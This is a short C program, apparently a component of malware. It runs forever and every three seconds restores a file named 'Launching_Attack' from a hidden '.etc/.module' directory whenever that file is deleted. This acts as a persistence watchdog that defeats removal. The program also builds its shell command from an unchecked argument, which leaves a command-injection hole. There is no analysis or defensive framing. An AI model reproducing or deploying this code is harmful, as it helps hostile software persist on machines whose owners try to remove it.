#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/wait.h>
#include <sys/stat.h> 

int main (int argc, char *argv[])
{
	char path[50];
	char cmd[160];

	snprintf (path, 50, "%s/.Launch_Attack/Launching_Attack", argv[1]);
	snprintf (cmd, 160, "[ -f %s/.Launch_Attack/Launching_Attack ] || cp -f %s/.etc/.module/Launching_Attack %s/.Launch_Attack/", argv[1], argv[1], argv[1]);

	while (1)
	{
		if (access (path, F_OK) == -1)
			system (cmd);

		sleep (3);
	}
}
